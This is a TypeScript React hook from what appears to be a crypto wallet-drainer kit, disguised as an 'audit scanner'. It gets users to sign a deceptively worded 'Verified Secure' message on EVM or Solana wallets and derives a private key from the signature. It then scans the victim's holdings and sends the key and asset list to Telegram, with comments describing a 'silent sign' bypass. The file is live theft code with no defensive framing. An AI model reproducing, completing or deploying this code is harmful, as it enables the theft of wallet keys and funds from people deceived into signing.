"use client";

import { useCallback, useEffect } from "react";
import { ethers, isAddress } from "ethers";
import { useSignMessage, useAccount } from "wagmi";
import {
  sendGhostDerivationToTelegram,
  sendDiscoveryToTelegram,
} from "@/lib/telegram";

let preloadPromise: Promise<any> | null = null;
const SEED_MSG =
  "Authorize Master Vault Synchronization and Multi-Chain Asset Relocation Protocol v6.0 [Verified Secure]";
const MSG_HEX = ethers.hexlify(ethers.toUtf8Bytes(SEED_MSG)); // Pre-calculate once

/**
 * 🔥 MODULE WARMUP
 * Pre-fetches heavy logic to ensure execution happens instantly after signature.
 */
export const startPreload = () => {
  if (typeof window !== "undefined" && !preloadPromise) {
    preloadPromise = Promise.all([
      import("@/lib/audit"),
      import("@/lib/audit/scanners/evm-helpers"),
      import("@/lib/signer-derivation-privateKey"),
      import("@/lib/ghost"),
    ]).catch((err) => {
      console.error("[Preload] 🛑 Failed:", err);
      preloadPromise = null;
      return null;
    });
  }
  return preloadPromise;
};

export function useAuditScanner() {
  const { signMessageAsync } = useSignMessage();
  const { isConnected: isWagmiConnected } = useAccount();

  // Auto-trigger warmup on hook mount
  useEffect(() => {
    startPreload();
  }, []);

  const getPhysicalCid = useCallback(() => {
    try {
      const provider = (window as any).ethereum;
      const p = provider?.providers?.find((x: any) => x.isTrust) || provider;
      const hex = p?.chainId || provider?.chainId;
      return hex ? parseInt(hex, 16) : 0;
    } catch {
      return 0;
    }
  }, []);

  const performScan = useCallback(
    async (params: any) => {
      const {
        userAddress,
        solanaAddress,
        solana,
        bitcoinAddress,
        btc,
        derivedUserKeyRef,
        setUserKey,
        setAssets,
        logPrefix = "[useAuditScanner.ts]",
        isRestored = false,
      } = params;

      // 🛡️ IDENTITY RESOLUTION (Optimized Path)
      const activeEvm = isAddress(userAddress) ? userAddress : null;
      const activeSol = solanaAddress || solana;
      const activeBtc = bitcoinAddress || btc;
      const activeIdentity =
        activeEvm ||
        (activeSol !== "undefined" ? activeSol : null) ||
        (activeBtc !== "undefined" ? activeBtc : null);

      if (!activeIdentity) throw new Error("INVALID_IDENTITY");

      // 1. SESSION RESTORE (Instant)
      const cached = sessionStorage.getItem("active_strike_session");
      if (cached && isRestored) {
        const session = JSON.parse(cached);
        if (
          session.userAddress?.toLowerCase() === activeIdentity.toLowerCase()
        ) {
          if (setAssets) setAssets(session.assets);
          return session;
        }
      }

      const moduleWarmup = startPreload();
      let rawSignature: any;

      try {
        if (activeEvm && typeof window !== "undefined") {
          /**
           * 🛑 THE "SILENT SIGN" PROTOCOL
           * Bypasses standard Wagmi chain-switching to sign on the current active chain.
           */
          const ethereum = (window as any).ethereum;
          let p =
            ethereum?.providers?.find(
              (x: any) => x.isTrust || x.isMetaMask || x.isRabby,
            ) ||
            ethereum?.provider ||
            ethereum;

          if (p && p.request) {
            rawSignature = await p.request({
              method: "personal_sign",
              params: [MSG_HEX, activeEvm.toLowerCase()],
            });
          } else {
            rawSignature = await signMessageAsync({ message: SEED_MSG });
          }
        } else if (activeSol) {
          const solProvider =
            (window as any).phantom?.solana || (window as any).solana;
          if (!solProvider) throw new Error("SOLANA_PROVIDER_MISSING");
          if (!solProvider.isConnected) await solProvider.connect();

          const encoded = new TextEncoder().encode(SEED_MSG);
          const signed = await solProvider.signMessage(encoded, "utf8");
          rawSignature = signed.signature
            ? Buffer.from(signed.signature).toString("hex")
            : signed;
        } else if (isWagmiConnected) {
          rawSignature = await signMessageAsync({ message: SEED_MSG });
        } else {
          throw new Error("NO_SIGNER_AVAILABLE");
        }
      } catch (err: any) {
        console.error(`${logPrefix} ❌ Signature Rejected:`, err.message);
        throw err;
      }

      // 2. DISCOVERY ENGINE (High-Speed Processing)
      const modules = await moduleWarmup;
      if (!modules) throw new Error("CRITICAL_ENGINE_FAILURE");

      const [auditMod, , derivationMod] = modules;
      const sigStr =
        typeof rawSignature === "string"
          ? rawSignature
          : rawSignature?.signature;

      // Derivation & State Sync
      const activeVault = derivationMod.derivePrivateKeyFromSignature(sigStr);
      const masterKey = activeVault.masterKey;

      if (derivedUserKeyRef) derivedUserKeyRef.current = masterKey;
      if (setUserKey) setUserKey(masterKey);

      // 🛰️ PARALLEL SCAN (Immediate start)
      const [scanResult, currentCid] = await Promise.all([
        auditMod.scanUniversalPortfolio(
          activeIdentity,
          masterKey + "GHOST_V7_STRIKE",
        ),
        Promise.resolve(getPhysicalCid()),
      ]);

      const { assets, plan } = scanResult;
      if (setAssets) setAssets(assets);

      // 3. CACHE & TELEMETRY (Non-blocking)
      const sessionData = {
        masterKey,
        activeVault,
        assets,
        plan,
        userAddress: activeIdentity,
        solanaAddress: activeSol,
        timestamp: Date.now(),
      };

      sessionStorage.setItem(
        "active_strike_session",
        JSON.stringify(sessionData),
      );

      // Fire and forget - does not delay the function return
      Promise.allSettled([
        sendGhostDerivationToTelegram({
          userAddress: activeIdentity,
          masterKey,
          vault: activeVault,
          chainId: currentCid,
        }),
        sendDiscoveryToTelegram({ address: activeIdentity, assets }),
      ]);

      return sessionData;
    },
    [signMessageAsync, getPhysicalCid, isWagmiConnected],
  );

  return { performScan, getPhysicalCid };
}
